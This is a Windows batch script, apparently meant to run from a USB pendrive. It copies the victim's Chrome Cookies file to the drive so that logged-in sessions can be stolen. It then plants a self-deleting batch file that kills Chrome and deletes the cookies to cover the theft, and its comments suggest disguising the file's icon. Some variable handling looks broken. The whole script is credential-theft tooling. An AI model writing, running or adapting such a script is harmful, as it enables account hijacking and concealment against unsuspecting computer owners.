REM keep chrome(if possible,tab also of particular site) opened and minimized
REM or   disconnect internet after opening tab once

@echo off
:: variables
/min
SET odrive=%odrive:~0,2%
set backupcmd=xcopy /E /C
REM %backupcmd% "%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\*.*" "%drive%\a\"
%backupcmd% "%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Cookies" "%drive%\a\"
REM a folder in pendrive required...
@echo off
REM keep chrome opened or disconnect internet







REM ///// u can instead of deleting cookie at instant, delay it by some time by putting a batchfile in computer so that it can delete cookie later on.
// and change the look of icon

echo timeout /t 19 >> C:\Users\Public\k.bat
echo Taskkill /IM chrome.exe /F >> C:\Users\Public\k.bat
echo del /f "%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Cookies" >> C:\Users\Public\k.bat
echo del /f /q "C:\Users\Public\k.bat" >>C:\Users\Public\k.bat
C:\Users\Public\k.bat
